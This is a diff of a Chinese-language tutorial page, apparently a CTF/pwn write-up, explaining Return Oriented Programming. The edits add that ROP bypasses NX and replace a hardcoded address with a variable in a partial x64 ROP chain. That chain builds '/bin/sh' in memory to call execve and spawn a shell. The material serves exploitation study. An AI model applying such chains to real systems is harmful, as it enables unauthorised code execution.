@@ -83,7 +83,7 @@
         alt/></a></p>
 <h2 id="rop-chain">ROP chain</h2>
 <p>ROP = Return Oriented Programming</p>
-<p>顧名思義，就是利用 結尾有 ret 的 gadgets (一小段 x86 組語)來湊成我們想要做的事情。</p>
+<p>顧名思義，就是利用 結尾有 ret 的 gadgets (一小段 x86 組語)，繞過 NX 的保護機制，來湊成我們想要做的事情。</p>
 <p>對於 pwn ，我們就是希望可以透過 ROP chain 湊成 <code>execve(&quot;/bin/sh&quot;, 0, 0)</code>，來取得執行 shell 的系統權限。</p>
 <p>另外，在撰寫 ROP 時，必須確認該 ELF 是 x86 還是 x64，因為 兩者的 system call 的呼叫（傳參）方式不同</p>
 <ul>
@@ -112,7 +112,7 @@ gadget4 = 0x0442a19 # pop rdx ; pop rsi ; ret
 gadget5 = 0x044f6cc # pop rax ; ret
 syscall = 0x04003da
 
-rop =  p64(gadget1) + p64(0x06ca080)
+rop =  p64(gadget1) + p64(data_sec)
 rop += p64(gadget2) + &quot;/bin/sh\x00&quot;
 rop += p64(gadget3)
 rop += p64(gadget4) + p64(0x0)*2
